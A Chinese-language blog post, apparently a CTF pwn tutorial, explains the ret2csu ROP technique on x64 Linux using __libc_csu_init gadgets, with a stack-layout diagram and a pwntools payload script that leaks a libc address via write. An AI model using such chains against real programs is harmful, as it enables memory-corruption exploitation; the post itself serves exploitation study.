---
title: ret2csu
date: 2026-01-26 09:51:03
tags: 
  - Pwn
---

在 x64 Linux 环境下，函数调用的前三个参数是通过寄存器 `rdi`, `rsi`, `rdx` 传递的。

如果我们想调用 `write(1, buf, len)` 或 `execve("/bin/sh", 0, 0)`，我们需要控制这三个寄存器。在大型程序中，我们可以很容易找到 `pop rdi; ret` 这样的指令片段（Gadgets）。但在小型程序中，这种完美的 Gadget 往往不存在。

ret2csu 的原理在于利用程序中几乎都会存在的 `__libc_csu_init` 函数。这个函数用来初始化 libc，因此几乎所有动态链接的程序里都有它。在这个函数内部，恰好有一段代码可以用来控制寄存器并调用函数。

### 深入剖析 `__libc_csu_init`

我们要利用的是该函数中的两段代码片段（Gadgets）。

#### Gadget 1 (这也是通常攻击链的入口)

位于函数的尾部，用于将栈上的数据弹出到寄存器中：

```assembly
; Gadget 1: load_regs
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

作用： 这允许我们从栈上控制 `rbx`, `rbp`, `r12`, `r13`, `r14`, `r15` 这 6 个寄存器的值。

#### Gadget 2 (核心利用点)

位于函数的中部，用于利用上述寄存器赋值参数并执行调用：

```assembly
; Gadget 2: call_func
mov rdx, r15       ; 将 r15 的值赋给 rdx (第3个参数)
mov rsi, r14       ; 将 r14 的值赋给 rsi (第2个参数)
mov edi, r13d      ; 将 r13 的低32位赋给 edi (第1个参数，注意是 edi 不是 rdi)
call qword ptr [r12+rbx*8] ; 调用函数
add rbx, 1         ; rbx 加 1
cmp rbx, rbp       ; 比较 rbx 和 rbp
jne 0x...70        ; 如果不相等，跳转回 Gadget 2 开头
...
pop ...            ; 这里的后续通常接回 Gadget 1
ret

```

作用：
将我们控制的通用寄存器（`r15`, `r14`, `r13`）移动到参数寄存器（`rdx`, `rsi`, `edi`）。
执行函数调用。

### 攻击构造流程 (How to Attack)

要成功利用 ret2csu，我们需要精心构造栈布局，按以下顺序执行：

1. 跳转到 Gadget 1：填充寄存器。
2. 返回到 Gadget 2：转移参数并 Call 目标函数。
3. 处理 Call 后的逻辑：为了让程序继续运行或再次利用，需要绕过 `jne` 跳转。

#### 第一步：设置寄存器映射关系

根据汇编代码，我们需要这样预设值：

| 目标参数寄存器   | 来源寄存器 (在 Gadget 1 中控制) | 注意事项                                                     |
| ---------------- | ------------------------------- | ------------------------------------------------------------ |
| Argument 3 (RDX) | `pop r15`                       | 完全控制 (64位)                                              |
| Argument 2 (RSI) | `pop r14`                       | 完全控制 (64位)                                              |
| Argument 1 (RDI) | `pop r13`                       | 受限！ 只能控制 `edi` (低32位)，高32位会被清零。             |
| Call Target      | `pop r12`                       | `r12` 必须指向函数地址的指针 (例如 GOT 表地址)，而不是函数本身。 |
| 控制流逻辑       | `pop rbx`                       | 设置为 0                                                     |
| 控制流逻辑       | `pop rbp`                       | 设置为 1                                                     |

> 关于 `edi` 的限制： 因为指令是 `mov edi, r13d`，所以无法传递 64 位的指针作为第一个参数（例如指向堆上的地址）。但对于像 `write(1, ...)` 这种第一个参数是很小的数的情况，它是完美的。

#### 第二步：绕过检查

在 `call` 执行完后，程序执行：

`add rbx, 1` (rbx 变成 1)

`cmp rbx, rbp` (比较 1 和 rbp)

`jne ...`

如果我们设置 rbx = 0 和 rbp = 1：

Call 之后 `rbx` 变为 1。

`cmp 1, 1` 结果相等。

`jne` 不跳转，程序继续向下执行。

关键点： 程序会再次滑落到 Gadget 1 的 `pop` 序列

#### 第三步：构造 Payload

Payload 的栈布局通常如下（假设存在缓冲区溢出）：

```text
[ Padding ]                     ; 覆盖到 ret address
[ Address of Gadget 1 ]         ; pop rbx, rbp, r12, r13, r14, r15; ret
[ 0 ]                           ; -> rbx (为了后续 check)
[ 1 ]                           ; -> rbp (为了后续 check)
[ Pointer to Function ]         ; -> r12 (Call 目标，注意是函数指针的地址，如                                          ;    (got_write)
[ Arg 1 ]                       ; -> r13 (传给 edi)
[ Arg 2 ]                       ; -> r14 (传给 rsi)
[ Arg 3 ]                       ; -> r15 (传给 rdx)
[ Address of Gadget 2 ]         ; mov rdx, r15; ... call [r12+rbx*8]
[ Padding * 7 ]                 ; 填充 56 字节。因为 Gadget 2 跑完会再次执行 Gadget 1                                 ; 的 6 个 pop + 1 个 ret
[ Next ROP Chain ]              ; 下一步要执行的地址（比如回到 main 函数）
```

### 攻击脚本示例 (Python + Pwntools)

假设你要调用 `write(1, got_write, 8)` 来泄露 libc 地址：

```python
from pwn import *

# 假设已经获取了 gadget 地址
csu_gadget_1 = 0x40060a  # pop rbx, rbp, r12, r13, r14, r15; ret
csu_gadget_2 = 0x4005f0  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call ...

# 目标: write(1, got_write, 8)
# rdi(edi) = 1
# rsi = got_write
# rdx = 8
# call = [got_write] (调用 write 函数本身)

payload = flat([
    b'A' * padding_offset,
    
    # 1. 跳入 Gadget 1
    csu_gadget_1,
    0,              # rbx = 0
    1,              # rbp = 1
    got_write,      # r12 = got_write (这里存放的是 write 函数的地址)
    1,              # r13 -> edi = 1 (fd)
    got_write,      # r14 -> rsi = got_write (buf)
    8,              # r15 -> rdx = 8 (len)
    
    # 2. 跳入 Gadget 2
    csu_gadget_2,
    
    # 3. 填充垃圾数据 (因为 Gadget 2 结束会再次经过 Gadget 1 的 pop)
    0, 0, 0, 0, 0, 0, 0, 
    
    # 4. 返回地址 (通常返回 main 函数以便二次溢出)
    addr_main
])

```

### 注意事项与限制

Glibc 版本变化：
在较新的 Glibc 版本（通常是 glibc 2.34 及以后，或某些发行版的特定编译版本）中，`__libc_csu_init` 被移除了或代码发生了变化。如果题目环境是非常新的 Linux，这个方法可能失效。

RDI 截断：
如前所述，只能控制 `edi`（32位）。如果必须向第一个参数传递一个 64 位的指针（大于 `0xFFFFFFFF`），ret2csu 无法直接完成，需要配合其他 gadget。

Call 的间接寻址：
记住 `call [r12 + rbx*8]` 是调用内存地址指向的内容。如果 `r12` 直接填函数地址，程序会崩溃；必须填存放该函数地址的内存地址（如 GOT 表项）。

### 例题
